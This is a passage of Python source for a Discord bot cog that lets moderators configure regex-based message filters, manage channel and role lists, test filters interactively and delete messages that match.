            raise ValueError("Unhandled position value, please report this bug.")

        await self.bot.say('%s is %s set to match %s.' % (_filter.name, adj, desc))

    @recensor_set.command(pass_context=True, name='flags')
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_set_flags(self, ctx, filter_name: str, *, flags: str = None):
        """
        Configures a filter's regex flags

        Python's regex flags are documented here:
        https://docs.python.org/3/howto/regex.html#compilation-flags

        flags must be a combination of the following (or left blank to show the current setting):
        - A: Perform ASCII-only matching instead of Unicode matching
        - I: Do case-insensitive matches
        - L: Do a locale-aware match (depends on bot host's locale)
        - M: Make ^ and $ match line start/end instead of the whole message
        - S: Make . match any character, including newlines
        - X: Ignore ALL whitespace and #comments in the pattern (for readability)

        Any other characters are ignored.
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = filter_name.lower()
        _filter = settings and settings.get_filter(name)

        if not _filter:
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return

        flags = flags and ''.join(sorted(set(flags.upper()).intersection(FLAGS_DESC)))

        if flags is None:
            flags = _filter.flags
            adj = 'currently'
        elif _filter.flags == flags:
            adj = 'already'
        else:
            adj = 'now'
            _filter.flags = flags
            _filter.rebuild_predicate()
            self.save()

        if flags:
            desc = ':\n' + '\n'.join('`%c` - %s' % (k, FLAGS_DESC[k]) for k in flags)
        else:
            desc = ' empty.'

        await self.bot.say('Flags for %s are %s%s' % (_filter.name, adj, desc))

    @recensor_set.command(pass_context=True, name='pattern', rest_is_raw=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_set_pattern(self, ctx, filter_name: str, *, pattern):
        """
        Configures a filter's pattern

        Regex how to:
        https://docs.python.org/3/howto/regex.html#regex-howto

        Full syntax documentation:
        https://docs.python.org/3/library/re.html#regular-expression-syntax
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = filter_name.lower()
        _filter = settings and settings.get_filter(name)
        pattern = pattern.lstrip()

        if len(pattern) >= 2 and pattern[0] == pattern[-1] == '"':
            pattern = pattern[1:-1]

        if not _filter:
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return

        if not pattern:
            pattern = _filter.pattern
            desc = 'is currently:\n' + box(pattern)
        else:
            try:
                re.compile(pattern, flags_to_int(_filter.flags))
            except Exception as e:
                await self.bot.say(error("Error compiling regular expression:\n") +
                                   box(', '.join((x if type(x) is str else repr(x)) for x in e.args)))
                return

            inline_flags = re.match(r"^\(\?([a-z]+)\)(.*)", pattern, re.IGNORECASE | re.DOTALL)

            if inline_flags:
                flags, pattern = inline_flags.groups()
                _filter.flags = ''.join(sorted(set(flags.upper()).intersection(FLAGS_DESC)))
                desc = 'set (auto-converted inline flags).'
            else:
                desc = 'set.'

            _filter.pattern = pattern
            _filter.rebuild_predicate()
            self.save()

        await self.bot.say('Pattern for %s %s' % (_filter.name, desc))

    @recensor_set.command(pass_context=True, name='attachment')
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_set_attachment(self, ctx, filter_name: str, attachment_header: bool = None):
        """
        Show/set filter attachment header

        When enabled, each message will be prepended with {attachment:ATTACHMENT_FILENAME}
        This allows advanced filtering based on whether an attachment is present, as well as
        based on the file's full name and/or extension.

        attachment_header must be a boolean option or left blank to show the current setting
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = filter_name.lower()
        _filter = settings and settings.get_filter(name)

        if type(attachment_header) not in (bool, type(None)):
            attachment_header = await ctx.command.do_conversion(ctx, bool, attachment_header)

        if not _filter:
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return
        elif attachment_header is None:
            attachment_header = _filter.attachment_header
            adj = 'currently'
        elif _filter.attachment_header == attachment_header:
            adj = 'already'
        else:
            adj = 'now'
            _filter.attachment_header = attachment_header
            self.save()

        desc = 'enabled' if attachment_header else 'disabled'
        msg = 'Attachment filename headers for %s are %s %s.' % (_filter.name, adj, desc)

        await self.bot.say(msg)

    @recensor_set.command(pass_context=True, name='channels')
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_set_channels(self, ctx, filter_name: str, operation: str = None, *options):
        """
        Configure a filter's channels list
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = filter_name.lower()
        _filter = settings and settings.get_filter(name)

        if not _filter:
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return
        elif not operation:
            ctx.view = StringView(filter_name)
            await self.recensor_list.invoke(ctx)

        await self._list_command_main(ctx, _filter, 'channels_list', operation, *options)

    @recensor_set.command(pass_context=True, name='roles')
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_set_roles(self, ctx, filter_name: str, operation: str = None, *options):
        """
        Configure a filter's roles list
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = filter_name.lower()
        _filter = settings and settings.get_filter(name)

        if not _filter:
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return
        elif not operation:
            ctx.view = StringView(filter_name)
            await self.recensor_list.invoke(ctx)

        await self._list_command_main(ctx, _filter, 'roles_list', operation, *options)

    @recensor.command(pass_context=True, name='test')
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_test(self, ctx, filter_name: str = None):
        """
        Interactively tests a single filter

        Testing does not take role, channel or priv_exempt into account, only mode, pattern and flags.
        The cog will not filter any of your messages in the channel while testing is active.
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = filter_name.lower()
        _filter = settings and settings.get_filter(name)
        already_testing = self._ignore_filters.get((ctx.message.channel.id, ctx.message.author.id))

        if not _filter:
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return
        elif already_testing:
            desc = 'that' if already_testing is _filter else ('the %s filter' % already_testing.name)
            await self.bot.say(warning('You are already testing %s filter in this channel!' % desc))
            return

        await self.bot.reply("I will respond to your messages with whether the message matched the %s filter and what "
                             "action would be taken as a result.\n\nAny changes to the filter's mode, pattern or flags "
                             "take effect immediately. Testing will stop when you post `stop test` or after 5 minutes "
                             "of no messages." % _filter.name)

        self._ignore_filters[(ctx.message.channel.id, ctx.message.author.id)] = _filter

        while True:
            msg = await self.bot.wait_for_message(author=ctx.message.author,
                                                  channel=ctx.message.channel,
                                                  timeout=5 * 60)

            if msg is None:
                await self.bot.reply('testing for %s stopped due to inactivity.' % _filter.name)
                break
            elif msg.content.lower().strip('\'"` ') == 'stop test':
                await self.bot.say('Testing stopped.')
                break

            content = preprocess_msg(_filter, msg)

            if _filter.asciify or (_filter.asciify is None and settings.asciify):
                content = asciify_string(content)

            match = await self.bot.loop.run_in_executor(self.executor, _filter.predicate, content)
            wl_msg = 'Your message will not be deleted because it matched and the filter is in whitelist mode.'
            bl_msg = 'Your message will be deleted because it matched and the filter is in blacklist mode.'

            if _filter.override:
                if match:
                    if _filter.mode:
                        action = wl_msg + ' Since this is an override filter, no further checks will be made.'
                    else:
                        action = bl_msg + ("Since this is an override filter, it won't matter if it matches any "
                                           "applicable (non-override) whitelist-mode filters.")
                else:
                    if _filter.mode:
                        action = ("Your message *might* be deleted because it did not match this whitelist mode filter."
                                  " If it matches another applicable whitelist filter, it will be allowed.")
                    else:
                        action = ("Your message will not be deleted because it does not match the filter and it is in "
                                  "blacklist mode.")
            elif match and not _filter.mode:
                action = bl_msg
            elif _filter.mode:
                if match:
                    action = wl_msg
                else:
                    action = ('Your message *might* be deleted because it did not match this whitelist mode filter. '
                              'If it matches another applicable whitelist filter, it will be allowed.')
            else:
                action = "Your message will not be deleted because it didn't match and the filter is in blacklist mode."

            await self.bot.say(action)

        self._ignore_filters.pop((ctx.message.channel.id, ctx.message.author.id), None)

    @recensor.command(pass_context=True, name='debug')
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_debug(self, ctx, message_id: str, channel: discord.Channel = None):
        """
        Tests a message against all configured filters

        Channel defaults to the current channel.
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)

        if not settings:
            await self.bot.say(warning('No settings in this server.'))

        if channel is None:
            channel = ctx.message.channel

        try:
            message = await self.bot.get_message(channel, message_id)
        except discord.HTTPException:
            await self.bot.say(error('Retrieving the message failed.'))
            return

        lines = []
        results, action = await settings.debug_message(message)

        for t in results:
            lines.append(' | '.join(map(str, t)))

        if action:
            lines.append('\nAction filter: %s: %s' % (action[0], 'delete' if action[1] else 'allow'))
        else:
            lines.append('No action.')

        msg = '\n'.join(lines)
        await self.bot.say(box(msg))

    @recensor.command(pass_context=True, name='regex101', aliases=['101'], rest_is_raw=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor_regex101(self, ctx, filter_name: str = None, *, test_message: str = None):
        """
        Posts a link to open a filter's pattern on regex101.com

        If a test message is given, it will be pre-filled.
        """
        server = ctx.message.server
        settings = self.settings.get(server.id)
        name = filter_name.lower()
        _filter = settings and settings.get_filter(name)
        test_message = test_message.lstrip(' ')  # rest_is_raw includes the space for whatever reason

        if not _filter:
            await self.bot.say(warning('There is no filter named "%s" in this server.' % name))
            return

        url = "https://regex101.com/?regex={}&flags={}&flavor=python"
        url = url.format(urllib.parse.quote(_filter.pattern), _filter.flags.lower())

        if test_message:
            url += '&testString={}'.format(urllib.parse.quote(test_message))

        await self.bot.say('Here is your link: <%s>' % url)

    # List operation stuff

    async def _list_command_transform_arg(self, ctx, _list, param, argument):
        if param.annotation is ItemTypeReference:
            converter = _list.item_type
        elif issubclass(param.annotation, FilterBase):
            argument = argument.lower().strip("'` ")
            settings = self.settings.get(ctx.message.server.id)
            list_owner = settings if argument == 'server' else settings.get_filter(argument)

            if list_owner is settings and param.annotation is FilterList:
                raise BadArgument("Only other filters may be specified.")
            elif not list_owner:
                raise BadArgument('There is no filter named "%s" in this server.' % argument)

            return list_owner
        else:
            converter = param.annotation
            if converter is param.empty:
                if param.default is not param.empty:
                    converter = str if param.default is None else type(param.default)
                else:
                    converter = str
            elif not inspect.isclass(type(converter)):
                raise discord.ClientException('Function annotation must be a type')

        try:
            return await ctx.command.do_conversion(ctx, converter, argument)
        except BadArgument as e:
            raise e
        except Exception as e:
            raise BadArgument('Converting "{0}" to `{1.__name__}` failed.'.format(argument, converter)) from e

    async def _list_command_parse_args(self, ctx, _list, operation, func, options):
        params = list(inspect.signature(func).parameters.values())[3:]
        options_iter = iter(options)
        args = []

        # Some basic validation/conversion
        fail_msg = None

        if options and not params:
            fail_msg = "The `%s` operation doesn't take any arguments." % operation
        else:
            for param in params:
                try:
                    arg = next(options_iter)
                    arg = await self._list_command_transform_arg(ctx, _list, param, arg)
                except StopIteration:
                    if param.default is param.empty and param.kind is not param.VAR_POSITIONAL:
                        fail_msg = 'The `{0}` operation requires the `{1.name}` argument.'.format(operation, param)
                    break
                except BadArgument as e:
                    fail_msg = e.args[0]
                    break
                except Exception as e:
                    fail_msg = error("Unhandled error converting `%s` parameter:\n" % param.name) + \
                               box('{0.__class__.__name__}: '.format(e) +
                                   ', '.join((x if type(x) is str else repr(x)) for x in e.args))
                    break

                args.append(arg)

        remaining = list(options_iter)

        if remaining and not fail_msg:
            if params[-1].kind is inspect.Parameter.VAR_POSITIONAL:
                try:
                    for argument in remaining:
                        args.append(await self._list_command_transform_arg(ctx, _list, params[-1], argument))
                except BadArgument as e:
                    fail_msg = e.args[0]
            else:
                fail_msg = "Too many arguments for the `%s` operation (it only takes %i)." % (operation, len(params))

        return args, fail_msg

    async def _list_command_main(self, ctx, parent: FilterBase, list_name: str, operation: str = None, *options):
        try:
            _list = getattr(parent, list_name)
        except AttributeError:
            await self.bot.say(error("%r has no `%s` attribute! Please report this bug." % (parent, list_name)))
            return

        if not operation:
            msg = warning("No list operation specified. Available operations:")
            await self._list_command_show_help(ctx, parent, _list, msg=msg, show_all=True)
            return

        try:
            func = self._list_functions[operation.lower()]
        except KeyError:
            msg = error("Unknown operation: '%s'. Available operations:" % operation)
            await self._list_command_show_help(ctx, parent, _list, msg=msg, show_all=True)
            return

        args, fail_msg = await self._list_command_parse_args(ctx, _list, operation, func, options)

        if fail_msg:
            await self._list_command_show_help(ctx, parent, _list, operation=operation, msg=error(fail_msg))
            return

        return await func(ctx, parent, _list, *args)

    async def _list_command_show_help(self, ctx, parent, _list: FilterList, *, operation: Optional[str] = None,
                                      msg: Optional[str] = None, show_all=False, show_fullhelp=False):

        if msg:
            reply = msg + '\n'
        else:
            reply = ""

        if show_all:
            operations = self._list_functions.keys()
        elif operation:
            operations = [operation]
            show_fullhelp = True
        else:
            operations = []

        texts = OrderedDict()

        for op in operations:
            func = self._list_functions[op]
            cmdline = [op]

            if show_fullhelp:
                params = list(inspect.signature(func).parameters.values())[3:]

                for param in params:
                    if param.kind is param.VAR_POSITIONAL:
                        param_desc = "{0.name}..."
                    elif param.default not in [None, param.empty]:
                        param_desc = "{0.name}={0.default}"
                    else:
                        param_desc = "{0.name}"

                    param_desc = ("<{0}>" if param.default is param.empty else "[{0}]").format(param_desc)
                    cmdline.append(param_desc.format(param))

            cmdline = ' '.join(cmdline)
            func_doc = inspect.getdoc(func)

            texts[cmdline] = func_doc

        if show_fullhelp:
            sections = ['%s\n\n%s' % t for t in texts.items()]
            reply += box('\n\n--------\n\n'.join(sections))
        else:
            cmd_maxlen = max(len(k) for k in texts)
            lines = [c.ljust(cmd_maxlen) + ' : ' + d.split('\n')[0] for c, d in texts.items()]
            reply += box('\n'.join(lines))

        await self.bot.say(reply)

    async def _list_command_help(self, ctx, parent, _list, operation: str = None):
        """
        Displays help for all or one operation(s)
        """
        show_all = False
        if operation in self._list_functions:
            msg = "Help for %s:" % operation
        elif operation:
            msg = error("Unknown operation: '%s'. Available operations:" % operation)
            operation = None
            show_all = True
        else:
            msg = 'Available operations:'
            show_all = True

        await self._list_command_show_help(ctx, parent, _list, operation=operation, msg=msg, show_all=show_all)

    async def _list_command_enabled(self, ctx, parent, _list, enabled: bool = None):
        """
        Sets whether the list is enabled or not

        If a list is disabled, it will be skipped when filtering messages.
        However, if overlay is on, the server-wide list will still be checked.
        """
        if enabled is None:
            adj = 'currently'
            enabled = _list.enabled
        elif _list.enabled == enabled:
            adj = 'already'
        else:
            adj = 'now'
            _list = await self._list_command_confirm_linked(ctx, parent, _list)

            if not _list:
                return

            _list.enabled = enabled
            self.save()

        await self.bot.say('List is %s %s.' % (adj, 'enabled' if enabled else 'disabled'))

    async def _list_command_mode(self, ctx, parent, _list, mode: str = None):
        """
        Set whether the list is a blacklist or whitelist

        Mode must be 'blacklist' or 'whitelist'.
        """
        if mode is not None:
            mode = mode.lower().strip("' `")

            if mode.lower().startswith('black'):
                mode = False
            elif mode.lower().startswith('white'):
                mode = True
            else:
                await self.bot.say(error("Argument must be `blacklist` or `whitelist`."))
                return

        if mode is None:
            adj = 'currently'
            mode = _list.mode
        elif _list.mode == mode:
            adj = 'already'
        else:
            adj = 'now'
            _list = await self._list_command_confirm_linked(ctx, parent, _list)

            if not _list:
                return

            _list.mode = mode
            self.save()

        await self.bot.say('Mode is %s %s.' % (adj, 'whitelist' if mode else 'blacklist'))

    async def _list_command_overlay(self, ctx, parent, _list, overlay: bool = None):
        """
        Set whether the list "overlays" the server-wide one
        """
        if isinstance(parent, ServerConfig):
            await self.bot.say('The server-wide list does not support the overlay setting.')
            return
        elif overlay is None:
            adj = 'currently'
            overlay = _list.overlay
        elif _list.overlay == overlay:
            adj = 'already'
        else:
            adj = 'now'
            _list = await self._list_command_confirm_linked(ctx, parent, _list)

            if not _list:
                return

            _list.overlay = overlay
            self.save()

        await self.bot.say('Overlay mode is %s %s.' % (adj, 'enabled' if overlay else 'disabled (standalone)'))

    async def _list_command_link(self, ctx, parent, _list, other_filter: Filter):
        """
        Makes the list a reference to another filter's

        WARNING: erases old configuration!
        """
        if _list.parent is not parent:
            await self.bot.say(error("That list is already linked; unlink it first."))
        elif isinstance(parent, ServerConfig):
            await self.bot.say(error("Cannot link a server-wide list."))
        elif parent is other_filter or _list is getattr(other_filter, _list.whoami):
            await self.bot.say(error("Cannot link a list to itself."))
        elif await self.confirm_thing(ctx, thing="replace this list with a link to %s's" % other_filter.name,
                                      require_yn=True):
            try:
                parent.parent.make_link(parent, other_filter, _list.whoami)
            except TypeError as e:
                await self.bot.say(error(', '.join((x if type(x) is str else repr(x)) for x in e.args)))
            except Exception as e:
                await self.bot.say(error("Error linking:\n") +
                                   box('{0.__class__.__name__}: '.format(e) +
                                       ', '.join((x if type(x) is str else repr(x)) for x in e.args)))

            self.save()
            await self.bot.say("List linked.")

    async def _list_command_unlink(self, ctx, parent, _list):
        """
        Makes a list a standalone, independent copy of its link target
        """
        if _list.parent is parent:
            await self.bot.say(error("Not linked."))
        else:
            try:
                parent.parent.break_link(parent, _list.whoami, copy=True)
            except TypeError as e:
                await self.bot.say(error(', '.join((x if type(x) is str else repr(x)) for x in e.args)))
            except Exception as e:
                await self.bot.say(error("Error unlinking:\n") +
                                   box('{0.__class__.__name__}: '.format(e) +
                                       ', '.join((x if type(x) is str else repr(x)) for x in e.args)))

            self.save()
            await self.bot.say("List unlinked and replaced with a copy of the former link target.")

    async def _list_command_add(self, ctx, parent, _list, *items: ItemTypeReference):
        """
        Adds one or more items to the list
        """
        extra = ''

        if _list.item_type is discord.Channel:
            # noinspection PyUnresolvedReferences
            x = [c for c in items if c.type is discord.ChannelType.text]
            if len(x) != len(items):
                extra = ' Provided voice channels were ignored.'

        updated_items = _list.items.union(x.id for x in items)
        num_added = len(updated_items) - len(_list.items)

        if not items:
            await self.bot.say("No items specified to add.")
        elif updated_items == _list.items:
            await self.bot.say("That operation didn't affect the list.")
        else:
            _list = await self._list_command_confirm_linked(ctx, parent, _list)

            if not _list:
                return
            elif await self._list_command_confirm_diff(ctx, _list, updated_items):
                _list.items.clear()
                _list.items.update(updated_items)
                self.save()
                await self.bot.say('Added %i item(s).%s' % (num_added, extra))

    async def _list_command_remove(self, ctx, parent, _list, *items: ItemTypeReference):
        """
        Removes one or more items from the list
        """
        updated_items = _list.items.difference(x.id for x in items)
        num_removed = len(_list.items) - len(updated_items)

        if not items:
            await self.bot.say("No items specified to remove.")
        elif updated_items == _list.items:
            await self.bot.say("That operation didn't affect the list.")
        else:
            _list = await self._list_command_confirm_linked(ctx, parent, _list)

            if not _list:
                return
            elif await self._list_command_confirm_diff(ctx, _list, updated_items):
                _list.items.clear()
                _list.items.update(updated_items)
                self.save()
                await self.bot.say('Removed %i item(s).' % num_removed)

    async def _list_command_cleanup(self, ctx, parent, _list):
        """
        Removes references to deleted items from the list
        """
        getter = ITEM_LOOKUP_GETTERS.get(_list.item_type)

        if not getter:
            await self.bot.say(error("Unable to find lookup for {0.__name__}! "
                                     "Please report this bug.".format(_list.item_type)))
        elif not getter(ctx):
            await self.bot.say(error("Unable to lookup {0.__name__} items in this context! "
                                     "Please report this bug.".format(_list.item_type)))
        else:
            to_remove = set()

            for item_id in _list.items:
                if not getter(ctx)(item_id):
                    to_remove.add(item_id)

            if to_remove:
                _list.items -= to_remove
                self.save()
                await self.bot.say('Removed %i references to deleted items.' % len(to_remove))
            else:
                await self.bot.say('Nothing to remove.')

    async def _list_command_invert(self, ctx, parent, _list):
        """
        Replaces the contents of the list with all items that aren't in the list

        This operation respects the overlay setting.
        """
        getter = ITEM_LIST_GETTERS.get(_list.item_type)

        if not getter:
            await self.bot.say(error("Unable to find lookup for {0.__name__}! "
                                     "Please report this bug.".format(_list.item_type)))
        elif not getter(ctx):
            await self.bot.say(error("Unable to lookup {0.__name__} items in this context! "
                                     "Please report this bug.".format(_list.item_type)))
        else:
            items = getter(ctx)
            new_id_list = set()

            for item in items:
                if item in _list:
                    continue
                elif _list.item_type is discord.Channel and item.type is not discord.ChannelType.text:
                    continue
                new_id_list.add(item.id)

            _list = await self._list_command_confirm_linked(ctx, parent, _list)

            if not _list:
                return
            elif await self._list_command_confirm_diff(ctx, _list, new_id_list):
                _list.items.clear()
                _list.items.update(new_id_list)
                self.save()
                await self.bot.say('List inverted.')

    async def _list_command_clear(self, ctx, parent, _list):
        """
        Removes ALL items from the list (doesn't reset mode or disable)
        """

        if not _list.items:
            await self.bot.say("List is already empty.")
        else:
            _list = await self._list_command_confirm_linked(ctx, parent, _list)

            if not _list:
                return
            elif await self.confirm_thing(ctx, thing="clear this list?", require_yn=True):
                _list.items.clear()
                self.save()
                await self.bot.say('List cleared.')

    async def _list_command_replace(self, ctx, parent, _list, other_filter: FilterBase):
        """
        Replaces the contents of a list with another's
        """
        other_list = getattr(other_filter, _list.whoami)
        if _list is other_list:
            await self.bot.say("There's no reason to replace a list with itself.")
        elif _list.items == other_list.items:
            await self.bot.say("Lists are already identical.")
        else:
            _list = await self._list_command_confirm_linked(ctx, parent, _list)

            if not _list:
                return
            elif await self._list_command_confirm_diff(ctx, _list, other_list.items):
                _list.items.clear()
                _list.items.update(other_list.items)
                self.save()
                await self.bot.say('List updated.')

    async def _list_command_union(self, ctx, parent, _list, other_filter: FilterBase):
        """
        Like replace, but only adds new items
        """
        other_list = getattr(other_filter, _list.whoami)
        updated_items = _list.items | other_list.items

        if _list is other_list:
            await self.bot.say("A list's union with itself is itself, doing nothing.")
        elif updated_items == _list.items:
            await self.bot.say("That operation wouldn't affect the list.")
        else:
            _list = await self._list_command_confirm_linked(ctx, parent, _list)

            if not _list:
                return
            elif await self._list_command_confirm_diff(ctx, _list, updated_items):
                _list.items.clear()
                _list.items.update(updated_items)
                self.save()
                await self.bot.say('List updated.')

    async def _list_command_difference(self, ctx, parent, _list, other_filter: FilterBase):
        """
        Removes any items that are in the other list
        """
        other_list = getattr(other_filter, _list.whoami)
        updated_items = _list.items - other_list.items

        if _list is other_list:
            await self.bot.say("A list's difference with itself is empty; use the `clear` operation.")
        elif updated_items == _list.items:
            await self.bot.say("That operation wouldn't affect the list.")
        else:
            _list = await self._list_command_confirm_linked(ctx, parent, _list)

            if not _list:
                return
            elif await self._list_command_confirm_diff(ctx, _list, updated_items):
                _list.items.clear()
                _list.items.update(updated_items)
                self.save()
                await self.bot.say('List updated.')

    async def _list_command_intersect(self, ctx, parent, _list, other_filter: FilterBase):
        """
        Removes any items that are NOT also in the other list
        """
        other_list = getattr(other_filter, _list.whoami)
        updated_items = _list.items & other_list.items

        if _list is other_list:
            await self.bot.say("A list's intersection with itself is itself, doing nothing.")
        elif updated_items == _list.items:
            await self.bot.say("That operation wouldn't affect the list.")
        else:
            _list = await self._list_command_confirm_linked(ctx, parent, _list)

            if not _list:
                return
            elif await self._list_command_confirm_diff(ctx, _list, updated_items):
                _list.items.clear()
                _list.items.update(updated_items)
                self.save()
                await self.bot.say('List updated.')

    async def _list_command_symdiff(self, ctx, parent, _list, other_filter: FilterBase):
        """
        Replaces the list with items that are in EITHER list, but NOT both
        """
        other_list = getattr(other_filter, _list.whoami)
        updated_items = _list.items ^ other_list.items

        if _list is other_list:
            await self.bot.say("A list's symmetric difference with itself is empty; use the `clear` operation.")
        elif updated_items == _list.items:
            await self.bot.say("That operation wouldn't affect the list.")
        else:
            _list = await self._list_command_confirm_linked(ctx, parent, _list)

            if not _list:
                return
            elif await self._list_command_confirm_diff(ctx, _list, updated_items):
                _list.items.clear()
                _list.items.update(updated_items)
                self.save()
                await self.bot.say('List updated.')

    async def _list_command_confirm_diff(self, ctx, _list, updated_items: set, *, title: str = "Updated list:"):
        added = updated_items - _list.items
        removed = _list.items - updated_items
        nochange = _list.items & updated_items

        mention_fmt = MENTIONS_BY_DATACLASS.get(_list.item_type, '#%s')
        lines = []

        for s, fmt in ((added, '`+ `%s'), (removed, '`- `~~%s~~'), (nochange, '`= `%s')):
            lines.extend([(fmt % (mention_fmt % i)) for i in sorted(s)])

        embed = discord.Embed(title=title, description='\n'.join(lines))
        return await self.confirm_thing(ctx, confirm_msg="Are these changes correct?", require_yn=True, embed=embed)

    async def _list_command_confirm_linked(self, ctx, parent: Filter, _list: FilterList) -> Optional[FilterList]:
        if _list.parent is parent:
            return _list

        direct_parent = parent.links[_list.whoami]
        ult_parent = _list.parent

        if direct_parent is ult_parent:
            target_desc = direct_parent.name
        else:
            target_desc = "{0.name}, which ultimately links to {1.name}".format(direct_parent, ult_parent)

        await self.bot.say("This list is linked to {0}. Do you want to `copy` the list before changing it, `modify` "
                           "{1.name}'s list directly, or `cancel`? (timeout in 30s)".format(target_desc, ult_parent))

        while True:
            reply = await self.bot.wait_for_message(channel=ctx.message.channel, author=ctx.message.author, timeout=30)

            if reply is None:
                await self.bot.say('Timed out waiting for a response.')
                return None

            reply = reply.content.strip(' `"\'').lower()

            if reply == 'copy':
                try:
                    return parent.parent.break_link(parent, _list.whoami, copy=True)
                except TypeError as e:
                    await self.bot.say(error(', '.join((x if type(x) is str else repr(x)) for x in e.args)))
                except Exception as e:
                    await self.bot.say(error("Error unlinking:\n") +
                                       box('{0.__class__.__name__}: '.format(e) +
                                           ', '.join((x if type(x) is str else repr(x)) for x in e.args)))
                return None
            elif reply == 'modify':
                return _list
            elif reply == 'cancel':
                await self.bot.say('Command cancelled')
                return None
            else:
                await self.bot.say("Please only answer with `copy`, `modify`, or `cancel`.")

    # Utility

    def check_name(self, ctx, name):
        name = name.lower()

        if re.search(r'\s', name):
            return warning('Name cannot contain whitespace.')
        elif name in self.recensor.commands or any(name in c.aliases for c in self.recensor.commands.values()):
            return warning('Name cannot be the same as any `%srecensor` subcommands or their aliases.' % ctx.prefix)
        elif name in self.recensor_set.commands or any(name in c.aliases for c in self.recensor_set.commands.values()):
            return warning('Name cannot be the same as any `%srecensor set` subcommands or their aliases.' % ctx.prefix)

    async def confirm_thing(self, ctx, *, thing: Optional[str] = None, confirm_msg: Optional[str] = None,
                            require_yn: bool = False, timeout: Optional[int] = 30, **kwargs):
        if not confirm_msg:
            if thing:
                confirm_msg = warning('Are you sure you want to %s?' % thing)
            else:
                confirm_msg = warning('Are you sure?')

        if not (isinstance(timeout, (int, float)) and timeout > 0) and timeout is not None:
            raise ValueError('timeout parameter must be a number > 0 or None')
        elif timeout:
            confirm_msg += ' (reply `yes` within %is to confirm, `no` to cancel)' % timeout
        else:
            confirm_msg += ' (reply `yes` to confirm or `no` to cancel)'

        await self.bot.say(confirm_msg, **kwargs)

        while True:
            reply = await self.bot.wait_for_message(channel=ctx.message.channel, author=ctx.message.author,
                                                    timeout=timeout)

            if reply is None:
                await self.bot.say('Timed out waiting for a response.')
                return None
            elif reply.content.strip(' `"\'').lower() == 'yes':
                return True
            elif require_yn and reply.content.strip(' `"\'').lower() != 'no':
                await self.bot.say("Please specify `yes` or `no`.")
                continue
            else:
                await self.bot.say('Command cancelled.')
                return False

    def is_mod_or_superior(self, obj):  # Copied from red core mod.py
        if not isinstance(obj, (Message, discord.Member, discord.Role)):
            raise TypeError('Only messages, members or roles may be passed')

        server = obj.server
        admin_role = self.bot.settings.get_server_admin(server)
        mod_role = self.bot.settings.get_server_mod(server)

        if isinstance(obj, discord.Role):
            return obj.name in [admin_role, mod_role]
        elif isinstance(obj, Message):
            user = obj.author
        elif isinstance(obj, discord.Member):
            user = obj
        else:
            return False

        if user.id == self.bot.settings.owner:
            return True
        elif discord.utils.get(user.roles, name=admin_role):
            return True
        elif discord.utils.get(user.roles, name=mod_role):
            return True

        return False

    # Listeners

    async def on_message(self, message, *, _edit=False):
        server = message.server
        cache_key = (message.channel.id, message.author.id)

        # Fast checks
        if not (server and self.ready) or message.author == self.bot.user \
                or server.id not in self.settings or cache_key in self._ignore_filters:
            return

        settings = self.settings[server.id]
        message_deque = self._message_cache[cache_key]
        self.cleanup_deque(message_deque)

        # Only set if message is new or when updating existing
        if (message.id in message_deque) == _edit:
            message_deque[message.id] = message

        if not message.channel.permissions_for(server.me).manage_messages:
            return

        self._deleting.add(cache_key)
        list_cache = {}

        if await settings.check_message(message, list_cache):
            await self.bot.delete_message(message)
            message_deque.pop(message.id, None)  # deleting a message may make a gap

        await self.handle_seq(self.settings[server.id], message_deque, list_cache)
        self._deleting.discard(cache_key)

    async def on_message_edit(self, old_message, new_message):
        await self.on_message(new_message, _edit=True)

    async def on_message_delete(self, message):
        server = message.server
        cache_key = (message.channel.id, message.author.id)

        if not (server and self.ready) or message.author == self.bot.user \
                or server.id not in self.settings or cache_key in self._ignore_filters \
                or cache_key not in self._message_cache or cache_key in self._deleting:
            return

        message_deque = self._message_cache[cache_key]
        self.cleanup_deque(message_deque)
        message_deque.pop(message.id, None)

        if not message.channel.permissions_for(server.me).manage_messages:
            return

        self._deleting.add(cache_key)
        await self.handle_seq(self.settings[server.id], message_deque)
        self._deleting.discard(cache_key)

    @staticmethod
    def cleanup_deque(message_deque: BoundedOrderedDict):
        cutoff = datetime.utcnow() - timedelta(seconds=MSG_HISTORY_MAX_TIME)

        for message_obj in list(message_deque.values()):
            if message_obj.timestamp > cutoff:
                break
            else:
                message_deque.popitem(last=False)  # popleft

    async def handle_seq(self, settings: ServerConfig, message_deque: BoundedOrderedDict,
                         list_cache: Optional[dict] = None):
        all_to_delete = []

        # Try until the deque is empty or we're out of stuff to delete (cascades)
        while message_deque:
            to_delete = await settings.check_sequence(list(message_deque.values()), list_cache)

            if not to_delete:
                break
            else:
                all_to_delete.extend(to_delete)

            for deleted_message in to_delete:
                message_deque.pop(deleted_message.id, None)

        if not all_to_delete:
            return
        elif len(all_to_delete) == 1:
            await self.bot.delete_message(all_to_delete[0])
        else:
            await self.bot.delete_messages(all_to_delete)

    async def on_command(self, command, ctx):
        if ctx.cog is self and self.analytics:
            self.analytics.command(ctx)


def check_folder():
    if not os.path.exists(DATA_PATH):
        log.debug('Creating folder: %s' % DATA_PATH)
        os.makedirs(DATA_PATH)


def check_file():
    if dataIO.is_valid_json(JSON_PATH) is False:
        log.debug('Creating json: %s' % JSON_PATH)
        dataIO.save_json(JSON_PATH, {'_schema_version': 2})


def migrate_data(data):
    log.debug('Upgrading schema...')
    newdata = {'_schema_version': 2, '_v1_backup': data}
    for sid, sdata in data.items():
        i = 0

